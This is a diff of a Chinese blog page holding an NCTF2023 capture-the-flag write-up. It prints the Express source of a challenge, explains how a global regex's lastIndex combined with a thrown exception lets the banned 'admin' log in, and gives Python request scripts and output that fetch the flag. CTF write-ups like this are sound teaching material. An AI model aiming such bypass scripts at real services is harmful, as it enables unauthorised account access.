@@ -16,12 +16,12 @@
   <meta name="author" content="Zer0peach">
   <meta name="keywords" content="">
   
-    <meta name="description" content="NCTF2023前言因为是南邮的比赛，那肯定是X1r0z大佬出题，所以十分期待，但是打安洵杯耗费了1天时间，不过即使不打安洵杯也做不出来。。。。 web 1&#x2F;6  因为是共享账号，其他题（其实就一题，排除签到和问卷）是其他人做的  loggingX1r0z本来打算作为签到题的，但一直没人做出来，就给了挺多hint  X1r0z的WP 这个其实是之前研究 Log4j2 (CVE-2021-">
+    <meta name="description" content="NCTF2023前言因为是南邮的比赛，那肯定是X1r0z大佬出题，所以十分期待，但是打安洵杯耗费了1天时间，不过即使不打安洵杯也做不出来。。。。 web 1&#x2F;6  因为是共享账号，其他题（其实就一题，排除签到和问卷）是其他人做的  logging*X1r0z本来打算作为签到题的，但一直没人做出来，就给了挺多hint  X1r0z的WP 这个其实是之前研究 Log4j2 (CVE-2021">
 <meta property="og:type" content="article">
 <meta property="og:title" content="NCTF2023">
 <meta property="og:url" content="https://zer0peach.github.io/2023/12/24/NCTF2023/index.html">
 <meta property="og:site_name" content="Zer0peach can&#39;t think">
-<meta property="og:description" content="NCTF2023前言因为是南邮的比赛，那肯定是X1r0z大佬出题，所以十分期待，但是打安洵杯耗费了1天时间，不过即使不打安洵杯也做不出来。。。。 web 1&#x2F;6  因为是共享账号，其他题（其实就一题，排除签到和问卷）是其他人做的  loggingX1r0z本来打算作为签到题的，但一直没人做出来，就给了挺多hint  X1r0z的WP 这个其实是之前研究 Log4j2 (CVE-2021-">
+<meta property="og:description" content="NCTF2023前言因为是南邮的比赛，那肯定是X1r0z大佬出题，所以十分期待，但是打安洵杯耗费了1天时间，不过即使不打安洵杯也做不出来。。。。 web 1&#x2F;6  因为是共享账号，其他题（其实就一题，排除签到和问卷）是其他人做的  logging*X1r0z本来打算作为签到题的，但一直没人做出来，就给了挺多hint  X1r0z的WP 这个其实是之前研究 Log4j2 (CVE-2021">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://zer0peach.github.io/images/NCTF2023/image-20231226111317220.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/NCTF2023/image-20231224122835868.png">
@@ -29,8 +29,12 @@
 <meta property="og:image" content="https://zer0peach.github.io/images/NCTF2023/image-20231226111536455.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/NCTF2023/image-20231226111548860.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/NCTF2023/image-20231226111716939.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NCTF2023/image-20231229001555068.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NCTF2023/image-20231230023835206.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NCTF2023/image-20231230022919705.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/NCTF2023/image-20231230023909795.png">
 <meta property="article:published_time" content="2023-12-24T04:28:23.000Z">
-<meta property="article:modified_time" content="2023-12-26T09:21:44.204Z">
+<meta property="article:modified_time" content="2023-12-29T18:45:27.245Z">
 <meta property="article:author" content="Zer0peach">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://zer0peach.github.io/images/NCTF2023/image-20231226111317220.png">
@@ -238,7 +242,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.8k 字
+          23k 字
         
       </span>
     
@@ -249,7 +253,7 @@
         
         
         
-          16 分钟
+          195 分钟
         
       </span>
     
@@ -294,7 +298,7 @@
                 <h1 id="NCTF2023"><a href="#NCTF2023" class="headerlink" title="NCTF2023"></a>NCTF2023</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为是南邮的比赛，那肯定是X1r0z大佬出题，所以十分期待，但是打安洵杯耗费了1天时间，不过即使不打安洵杯也做不出来。。。。</p>
 <p>web 1&#x2F;6  因为是共享账号，其他题（其实就一题，排除签到和问卷）是其他人做的</p>
 <p><img src="/../images/NCTF2023/image-20231226111317220.png" srcset="/img/loading.gif" lazyload alt="image-20231226111317220"></p>
-<h2 id="logging"><a href="#logging" class="headerlink" title="logging"></a>logging</h2><p>X1r0z本来打算作为签到题的，但一直没人做出来，就给了挺多hint</p>
+<h2 id="logging"><a href="#logging" class="headerlink" title="logging*"></a>logging*</h2><p>X1r0z本来打算作为签到题的，但一直没人做出来，就给了挺多hint</p>
 <blockquote>
 <p>X1r0z的WP</p>
 <p>这个其实是之前研究 Log4j2 (CVE-2021-44228) 时想到的: SpringBoot 在默认配置下如何触发 Log4j2 JNDI RCE</p>
@@ -335,11 +339,626 @@
 
 
 
-<h2 id="wait-what"><a href="#wait-what" class="headerlink" title="wait what"></a>wait what</h2><p>因为1分钟会重置，再加上出错不知道维持多久，所以要快，应该用python写代码会好一些，但我懒得写于是分四块依次发包</p>
+<h2 id="wait-what"><a href="#wait-what" class="headerlink" title="wait what"></a>wait what</h2><div class="code-wrapper"><pre><code class="hljs javascript">
+<span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);
+<span class="hljs-keyword">const</span> child_process = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>)
+<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>()
+app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>())
+<span class="hljs-keyword">const</span> port = <span class="hljs-number">80</span>
+
+<span class="hljs-keyword">function</span> <span class="hljs-title function_">escapeRegExp</span>(<span class="hljs-params">string</span>) &#123;
+    <span class="hljs-keyword">return</span> string.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[.*+?^$&#123;&#125;()|[\]\\]/g</span>, <span class="hljs-string">&#x27;\\$&amp;&#x27;</span>);
+&#125;
+
+<span class="hljs-keyword">let</span> users = &#123;
+    <span class="hljs-string">&quot;admin&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,
+    <span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;user&quot;</span>,
+    <span class="hljs-string">&quot;guest&quot;</span>: <span class="hljs-string">&quot;guest&quot;</span>,
+    <span class="hljs-string">&#x27;hacker&#x27;</span>:<span class="hljs-string">&#x27;hacker&#x27;</span>
+&#125;
+
+<span class="hljs-keyword">let</span> banned_users = [<span class="hljs-string">&#x27;hacker&#x27;</span>]
+
+<span class="hljs-comment">// 你不准getflag</span>
+banned_users.<span class="hljs-title function_">push</span>(<span class="hljs-string">&quot;admin&quot;</span>)
+
+<span class="hljs-keyword">let</span> banned_users_regex = <span class="hljs-literal">null</span>;
+<span class="hljs-keyword">function</span> <span class="hljs-title function_">build_banned_users_regex</span>(<span class="hljs-params"></span>) &#123;
+	<span class="hljs-keyword">let</span> regex_string = <span class="hljs-string">&quot;&quot;</span>
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> username <span class="hljs-keyword">of</span> banned_users) &#123;
+        regex_string += <span class="hljs-string">&quot;^&quot;</span> + escapeRegExp(username) + <span class="hljs-string">&quot;$&quot;</span> + <span class="hljs-string">&quot;|&quot;</span>
+    &#125;
+
+    regex_string = regex_string.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, regex_string.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>)
+    banned_users_regex = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(regex_string, <span class="hljs-string">&quot;g&quot;</span>)
+&#125;
+
+<span class="hljs-comment">//鉴权中间件</span>
+<span class="hljs-keyword">function</span> <span class="hljs-title function_">requireLogin</span>(<span class="hljs-params">req, res, next</span>) &#123;
+    <span class="hljs-keyword">let</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>
+    <span class="hljs-keyword">let</span> password = req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span>
+    <span class="hljs-keyword">if</span> (!username || !password) &#123;
+        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;用户名或密码不能为空&quot;</span>)
+        <span class="hljs-keyword">return</span>
+    &#125;
+    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> username !== <span class="hljs-string">&quot;string&quot;</span> || <span class="hljs-keyword">typeof</span> password !== <span class="hljs-string">&quot;string&quot;</span>) &#123;
+        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;用户名或密码不合法&quot;</span>)
+        <span class="hljs-keyword">return</span>
+    &#125;
+    <span class="hljs-comment">// 基于正则技术的封禁用户匹配系统的设计与实现</span>
+    <span class="hljs-keyword">let</span> test1 = banned_users_regex.<span class="hljs-title function_">test</span>(username)
+    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`使用正则<span class="hljs-subst">$&#123;banned_users_regex&#125;</span>匹配<span class="hljs-subst">$&#123;username&#125;</span>的结果为：<span class="hljs-subst">$&#123;test1&#125;</span>`</span>)
+    <span class="hljs-keyword">if</span> (test1) &#123;
+		<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;第一个判断匹配到封禁用户：&quot;</span>,username)
+        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;用户&#x27;&quot;</span>+username + <span class="hljs-string">&quot;&#x27;被封禁，无法鉴权！&quot;</span>)
+        <span class="hljs-keyword">return</span>
+    &#125;
+    <span class="hljs-comment">// 基于in关键字的封禁用户匹配系统的设计与实现</span>
+    <span class="hljs-keyword">let</span> test2 = (username <span class="hljs-keyword">in</span> banned_users)
+    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`使用in关键字匹配<span class="hljs-subst">$&#123;username&#125;</span>的结果为：<span class="hljs-subst">$&#123;test2&#125;</span>`</span>)
+    <span class="hljs-keyword">if</span> (test2)&#123;
+        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;第二个判断匹配到封禁用户：&quot;</span>,username)
+        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;用户&#x27;&quot;</span>+username + <span class="hljs-string">&quot;&#x27;被封禁，无法鉴权！&quot;</span>)
+        <span class="hljs-keyword">return</span>
+    &#125;
+    <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> users &amp;&amp; users[username] === password) &#123;
+        <span class="hljs-title function_">next</span>()
+        <span class="hljs-keyword">return</span>
+    &#125;
+    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;用户名或密码错误，鉴权失败！&quot;</span>)
+&#125;
+
+<span class="hljs-keyword">function</span> <span class="hljs-title function_">registerUser</span>(<span class="hljs-params">username, password</span>) &#123;
+    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> username !== <span class="hljs-string">&quot;string&quot;</span> || username.<span class="hljs-property">length</span> &gt; <span class="hljs-number">20</span>) &#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;用户名不合法&quot;</span>
+    &#125;
+    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> password !== <span class="hljs-string">&quot;string&quot;</span> || password.<span class="hljs-property">length</span> &gt; <span class="hljs-number">20</span>) &#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;密码不合法&quot;</span>
+    &#125;
+    <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> users) &#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;用户已存在&quot;</span>
+    &#125;
+
+    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> existing_user <span class="hljs-keyword">in</span> users)&#123;
+        <span class="hljs-keyword">let</span> existing_user_password = users[existing_user]
+        <span class="hljs-keyword">if</span> (existing_user_password === password)&#123;
+            <span class="hljs-keyword">return</span> <span class="hljs-string">`您的密码已经被用户&#x27;<span class="hljs-subst">$&#123;existing_user&#125;</span>&#x27;使用了，请使用其它的密码`</span>
+        &#125;
+    &#125;
+
+    users[username] = password
+    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;注册成功&quot;</span>
+&#125;
+
+app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(<span class="hljs-string">&#x27;public&#x27;</span>))
+
+<span class="hljs-comment">// 每次请求前，更新封禁用户正则信息</span>
+app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) &#123;
+    <span class="hljs-keyword">try</span> &#123;
+        <span class="hljs-title function_">build_banned_users_regex</span>()
+		<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;封禁用户正则表达式（满足这个正则表达式的用户名为被封禁用户名）：&quot;</span>,banned_users_regex)
+    &#125; <span class="hljs-keyword">catch</span> (e) &#123;
+    &#125;
+    <span class="hljs-title function_">next</span>()
+&#125;)
+
+app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/api/register&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;
+    <span class="hljs-keyword">let</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>
+    <span class="hljs-keyword">let</span> password = req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span>
+    <span class="hljs-keyword">let</span> message = <span class="hljs-title function_">registerUser</span>(username, password)
+    res.<span class="hljs-title function_">send</span>(message)
+&#125;)
+
+app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/api/login&quot;</span>, requireLogin, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;
+    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;登录成功！&quot;</span>)
+&#125;)
+
+app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/api/flag&quot;</span>, requireLogin, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;
+    <span class="hljs-keyword">let</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>
+    <span class="hljs-keyword">if</span> (username !== <span class="hljs-string">&quot;admin&quot;</span>) &#123;
+        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;登录成功，但是只有&#x27;admin&#x27;用户可以看到flag，你的用户名是&#x27;&quot;</span> + username + <span class="hljs-string">&quot;&#x27;&quot;</span>)
+        <span class="hljs-keyword">return</span>
+    &#125;
+    <span class="hljs-keyword">let</span> flag = child_process.<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&quot;cat flag&quot;</span>).<span class="hljs-title function_">toString</span>()
+    res.<span class="hljs-title function_">end</span>(flag)
+    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&quot;有人获取到了flag！为了保证题目的正常运行，将会重置靶机环境！&quot;</span>)
+    res.<span class="hljs-title function_">on</span>(<span class="hljs-string">&quot;finish&quot;</span>, <span class="hljs-function">() =&gt;</span> &#123;
+        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123; process.<span class="hljs-title function_">exit</span>(<span class="hljs-number">0</span>) &#125;, <span class="hljs-number">1</span>)
+    &#125;)
+    <span class="hljs-keyword">return</span>
+&#125;)
+
+app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/ban_user&#x27;</span>, requireLogin, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;
+    <span class="hljs-keyword">let</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>
+    <span class="hljs-keyword">let</span> ban_username = req.<span class="hljs-property">body</span>.<span class="hljs-property">ban_username</span>
+    <span class="hljs-keyword">if</span>(!ban_username)&#123;
+        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;ban_username不能为空&quot;</span>)
+        <span class="hljs-keyword">return</span>
+    &#125;
+    <span class="hljs-keyword">if</span>(username === ban_username)&#123;
+        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;不能封禁自己&quot;</span>)
+        <span class="hljs-keyword">return</span>
+    &#125;
+    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> name <span class="hljs-keyword">of</span> banned_users)&#123;
+        <span class="hljs-keyword">if</span> (name === ban_username) &#123;
+            res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;用户已经被封禁&quot;</span>)
+            <span class="hljs-keyword">return</span>
+        &#125;
+    &#125;
+    banned_users.<span class="hljs-title function_">push</span>(ban_username)
+    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;封禁成功！&quot;</span>)
+&#125;)
+
+
+app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;
+    res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&quot;/static/index.html&quot;</span>)
+&#125;)
+
+app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-function">() =&gt;</span> &#123;
+    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`listening on port <span class="hljs-subst">$&#123;port&#125;</span>`</span>)
+&#125;)</code></pre></div>
+
+<p>既然admin已经被封禁了，那我们的思路只能是绕过检测</p>
+<p>有两个检测，我们先看第二个<code>in</code>关键字</p>
+<p><code>in</code>关键字返回的是数组下标索引，不是元素</p>
+<div class="code-wrapper"><pre><code class="hljs awk">var trees = new Array(<span class="hljs-string">&quot;redwood&quot;</span>, <span class="hljs-string">&quot;bay&quot;</span>, <span class="hljs-string">&quot;cedar&quot;</span>, <span class="hljs-string">&quot;oak&quot;</span>, <span class="hljs-string">&quot;maple&quot;</span>);
+<span class="hljs-number">0</span> <span class="hljs-keyword">in</span> trees; <span class="hljs-regexp">//</span> 返回 true
+<span class="hljs-number">3</span> <span class="hljs-keyword">in</span> trees; <span class="hljs-regexp">//</span> 返回 true
+<span class="hljs-number">6</span> <span class="hljs-keyword">in</span> trees; <span class="hljs-regexp">//</span> 返回 false
+<span class="hljs-string">&quot;bay&quot;</span> <span class="hljs-keyword">in</span> trees; <span class="hljs-regexp">//</span> 返回 false (必须使用索引号，而不是数组元素的值)</code></pre></div>
+
+<p>所以第二个检测几乎是没有作用</p>
+<p>接下来看第一个，带g的正则表达式我们可以查到</p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp/test">RegExp.prototype.test() - JavaScript | MDN (mozilla.org)</a></p>
+<div class="code-wrapper"><pre><code class="hljs node-repl"><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-keyword">let</span> r = <span class="hljs-regexp">/^admin$/g</span></span>
+undefined
+<span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">r.<span class="hljs-title function_">test</span>(<span class="hljs-string">&quot;admin&quot;</span>)</span>
+true
+<span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">r.<span class="hljs-property">lastIndex</span></span>
+5
+<span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">r.<span class="hljs-title function_">test</span>(<span class="hljs-string">&quot;admin&quot;</span>)</span>
+false
+<span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">r.<span class="hljs-property">lastIndex</span></span>
+0</code></pre></div>
+
+<p>这里就是一个可以逃过检测的地方</p>
+<p>但是</p>
+<div class="code-wrapper"><pre><code class="hljs scss"><span class="hljs-comment">// 每次请求前，更新封禁用户正则信息</span>
+app<span class="hljs-selector-class">.use</span>(function (req, res, next) &#123;
+    try &#123;
+        <span class="hljs-built_in">build_banned_users_regex</span>()
+      console<span class="hljs-selector-class">.log</span>(&quot;封禁用户正则表达式（满足这个正则表达式的用户名为被封禁用户名）：&quot;,banned_users_regex)
+    &#125; catch (e) &#123;
+    &#125;
+    <span class="hljs-built_in">next</span>()
+&#125;)</code></pre></div>
+
+<p>每次请求都会重新生成一个新的正则表达式，都会使<code>r.lastIndex</code>重新置为0</p>
+<blockquote>
+<p>思路就是在新的regex对象赋值之前，抛出 异常 来绕过 regex 的更新！</p>
+<p>因为try catch的存在，在<code>build_banned_users_regex</code>方法内抛出异常不会导致请求被中断</p>
+<p>如果传入 escapeRegExp(string) 函数中的 string 参数为非字符串类型，</p>
+<p>则string不存在 replace 属性，会抛出TypeError，如此来绕过 regex 的更新</p>
+</blockquote>
+<p>所以我们传入参数 <code>ban_username</code> 为 对象、数组 等其他数据类型</p>
+<p>当我们使用<code>/api/ban_user</code>把其他数据类型加入到<code>banned_users</code>数组后</p>
+<p>每次请求时都会抛出<code>TypeError</code></p>
+<p>所以当我们封禁了这个其他数据类型后，我们使用的就是一直是同一个正则表达式了</p>
+<p>测试一下，我们把获取到flag就退出的代码删掉，执行以下代码，若出现三次<code>whoami</code>的结果，猜想即是正确的</p>
+<div class="code-wrapper"><pre><code class="hljs stylus">import requests
+
+remote_addr=<span class="hljs-string">&quot;http://localhost:80&quot;</span>
+
+rs = requests<span class="hljs-selector-class">.Session</span>()
+
+resp = rs<span class="hljs-selector-class">.post</span>(remote_addr+<span class="hljs-string">&quot;/api/register&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>&#125;)
+<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(resp.text)</span></span>
+
+resp = rs<span class="hljs-selector-class">.post</span>(remote_addr+<span class="hljs-string">&quot;/api/ban_user&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;ban_username&quot;</span>:<span class="hljs-selector-attr">[0]</span>&#125;)
+<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(resp.text)</span></span>
+
+#匹配成功，r.lastIndex变为<span class="hljs-number">5</span>
+resp = rs<span class="hljs-selector-class">.post</span>(remote_addr+<span class="hljs-string">&quot;/api/flag&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;)
+<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(resp.text)</span></span>
+#匹配失败，获取flag，r.lastIndex的结果重置<span class="hljs-number">0</span>
+resp = rs<span class="hljs-selector-class">.post</span>(remote_addr+<span class="hljs-string">&quot;/api/flag&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;)
+<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(resp.text)</span></span>
+
+#匹配成功，r.lastIndex变为<span class="hljs-number">5</span>
+resp = rs<span class="hljs-selector-class">.post</span>(remote_addr+<span class="hljs-string">&quot;/api/flag&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;)
+<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(resp.text)</span></span>
+#匹配失败，获取flag，r.lastIndex的结果重置<span class="hljs-number">0</span>
+resp = rs<span class="hljs-selector-class">.post</span>(remote_addr+<span class="hljs-string">&quot;/api/flag&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;)
+<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(resp.text)</span></span>
+
+#匹配成功，r.lastIndex变为<span class="hljs-number">5</span>
+resp = rs<span class="hljs-selector-class">.post</span>(remote_addr+<span class="hljs-string">&quot;/api/flag&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;)
+<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(resp.text)</span></span>
+#匹配失败，获取flag，r.lastIndex的结果重置<span class="hljs-number">0</span>
+resp = rs<span class="hljs-selector-class">.post</span>(remote_addr+<span class="hljs-string">&quot;/api/flag&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;)
+<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(resp.text)</span></span></code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs livescript">注册成功
+封禁成功！
+用户<span class="hljs-string">&#x27;admin&#x27;</span>被封禁，无法鉴权！
+zeropeach<span class="hljs-string">\86136</span>
+
+用户<span class="hljs-string">&#x27;admin&#x27;</span>被封禁，无法鉴权！
+zeropeach<span class="hljs-string">\86136</span>
+
+用户<span class="hljs-string">&#x27;admin&#x27;</span>被封禁，无法鉴权！
+zeropeach<span class="hljs-string">\86136</span></code></pre></div>
+
+<p>所以封禁后，用的一直就是同一个表达式</p>
+<p>先访问<code>/api/flag</code>匹配一次admin，使<code>r.lastIndex</code>变为5后</p>
+<p>再次访问<code>/api/flag</code>，因为没有更新所以<code>r.lastIndex</code>仍为5，所以<code>banned_users_regex.text(&quot;admin&quot;)</code>的结果就变为<code>false</code>，就绕过了</p>
+<p>因为1分钟会重置，再加上出错不知道维持多久，所以要快，应该用python写代码会好一些，但我懒得写于是分四块依次发包</p>
 <p><img src="/../images/NCTF2023/image-20231226111525334.png" srcset="/img/loading.gif" lazyload alt="image-20231226111525334"></p>
 <p><img src="/../images/NCTF2023/image-20231226111536455.png" srcset="/img/loading.gif" lazyload alt="image-20231226111536455"></p>
 <p><img src="/../images/NCTF2023/image-20231226111548860.png" srcset="/img/loading.gif" lazyload alt="image-20231226111548860"></p>
 <p><img src="/../images/NCTF2023/image-20231226111716939.png" srcset="/img/loading.gif" lazyload alt="image-20231226111716939"></p>
+<div class="code-wrapper"><pre><code class="hljs stylus">import requests
+
+remote_addr=<span class="hljs-string">&quot;http://117.50.175.234:9001&quot;</span>
+
+rs = requests<span class="hljs-selector-class">.Session</span>()
+
+resp = rs<span class="hljs-selector-class">.post</span>(remote_addr+<span class="hljs-string">&quot;/api/register&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>&#125;)
+<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(resp.text)</span></span>
+
+resp = rs<span class="hljs-selector-class">.post</span>(remote_addr+<span class="hljs-string">&quot;/api/ban_user&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;ban_username&quot;</span>:<span class="hljs-selector-attr">[0]</span>&#125;)
+<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(resp.text)</span></span>
+
+resp = rs<span class="hljs-selector-class">.post</span>(remote_addr+<span class="hljs-string">&quot;/api/flag&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;)
+<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(resp.text)</span></span>
+resp = rs<span class="hljs-selector-class">.post</span>(remote_addr+<span class="hljs-string">&quot;/api/flag&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;)
+<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(resp.text)</span></span></code></pre></div>
+
+<h2 id="webshell-generator"><a href="#webshell-generator" class="headerlink" title="webshell generator"></a>webshell generator</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">security_validate</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;
+        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\r|\n/&#x27;</span>, <span class="hljs-variable">$value</span>)) &#123;
+            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$key</span> 不能包含换行符！&quot;</span>);
+        &#125;
+        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$value</span>) &gt; <span class="hljs-number">114</span>) &#123;
+            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$key</span> 不能超过114个字符！&quot;</span>);
+        &#125;
+    &#125;
+&#125;
+<span class="hljs-title function_ invoke__">security_validate</span>();
